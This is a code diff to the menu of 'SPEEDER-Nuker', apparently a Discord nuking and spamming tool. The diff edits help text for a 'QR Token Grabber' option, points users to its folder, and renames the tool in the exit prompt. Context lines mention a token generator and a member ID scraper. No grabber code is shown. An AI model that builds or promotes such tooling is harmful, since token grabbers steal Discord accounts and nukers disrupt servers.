@@ -1,6 +1,5 @@
 
 #########################################################
-
 from utilities.Settings.common import *
 from utilities.Settings.libarys import *
 from utilities.Settings.update import search_for_updates
@@ -1113,20 +1112,16 @@ Token Generator is in the Paid Version of DISCORD SERVER!\nIf You Are Wanting to
                 print(f"[{r}!{Fore.RESET}] ERROR!")
                 break
 
-
-
-
-#   QR TOKEN GRABBER
+#   QR TOKKEN GRABBER
     if choice == '27':
         Spinner()
-        setTitle(f"About    |    ")
-        Write.Print("\nHello, thanks for using SPEEDER-Nuker!\nopen QR TOKEN GRABBER folder!\nDiscord: JavorR#8365\nGithub: https://github.com/JavorR1\nWebsite: https://speedernuker.netlify.app/\n\n", Colors.blue_to_cyan, interval=0.015)
+        setTitle(f"QR Token Grabber Help   |    ")
+        Write.Print("\nHello, thanks for using SPEEDER-Nuker!\nIf you want to start QR Token Grabber, enter the folder called QR Tokken Grabber, read the read.me if you are starting it for the first time or if you don't know how to start it!\nDiscord: JavorR#8365\nGithub: https://github.com/JavorR1\nWebsite: https://speedernuker.netlify.app/\n\n", Colors.blue_to_cyan, interval=0.015)
 
         time.sleep(1)
         exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
         exit = clear()
         exit = spammer()
-
 
 #   MEMBER ID SCRAPER
     if choice == '28':
@@ -1268,7 +1263,7 @@ Token Generator is in the Paid Version of DISCORD SERVER!\nIf You Are Wanting to
 #   EXIT
     if choice == '32':
         Spinner()
-        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit GANG-Nuker? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
+        exit = True if input(f"\n[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Are You Sure You Want To Exit SPEEDER-Nuker? Y/N: ").lower() == "y" else spammer() or "n" == sys.exit(0)
     else:
         print(f"")
         time.sleep(0)
